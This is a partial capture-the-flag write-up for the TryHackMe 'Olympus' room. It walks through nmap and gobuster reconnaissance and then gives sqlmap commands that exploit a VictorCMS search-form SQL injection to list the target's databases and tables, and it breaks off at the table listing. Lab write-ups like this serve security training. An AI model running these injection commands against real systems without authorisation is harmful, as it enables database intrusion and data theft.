This is a write up for the Olympus CTF room on TryHackMe.com

Task: Find four Flags on the targat machine.

Target IP: 10.10.83.227

Step 1: Start the target machine by pressing the green "Start Machine" button. Give it five minutes to start up.
After a few minutes you should see your target IP.Ours is 10.10.83.227

Step 2: Recon
Preform Nmap scan against the target IP address. ($ nmap -nmap -sV -O -A -v)
We see there are two open opets
22/tcp ssh
80/tcp http.

Step 3: Visit the webpage.
When we type in 10.10.83.227 into our URL we get an error message. However we can see that the URL changed to text 'olympus.thm'
Let's add this website to our hosts list ($ nano /etc/hosts) (add the following text at the bottom of the file:
10.10.83.227 olympus.thm). After we add the DNS name to the IP address in the host file, 
we can try again and we get a hit!
We can see that the website is under development, there is a message with email address root@the-it-department.
It also states the old version of the website is still accessible on this domain.

Step 4: Use Gobuster to enumurate website's directories. 
We will be using the SecLists common webcontent discovery list.
(gobuster dir -u olympus.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt)

We find one directory that we have access too, olympus.thm/~webmaster. It is the first version of the website.
Most of this website does not work as well, but there some useful bits of info. The most useful fild is the search bar.

Step 5: SQL Injection
When trying to get an sql error we can see that the data on this site is stored on MySQL on VictorCMS. 
We can use exploitDB to find that VictorCMS has a known search exploit that we can use.
($ sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3)

We find six available databases [6]:
[*] information_schema
[*] mysql
[*] olympus
[*] performance_schema
[*] phpmyadmin
[*] sys

Try getting the tables from olympus database.
($ â”€# sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --tables)

Database: olympus
